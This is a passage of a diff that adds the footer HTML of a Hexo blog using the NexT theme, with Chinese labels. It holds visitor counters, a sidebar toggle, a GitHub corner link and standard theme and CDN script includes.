+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">15k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">13 分钟</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Haurek" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
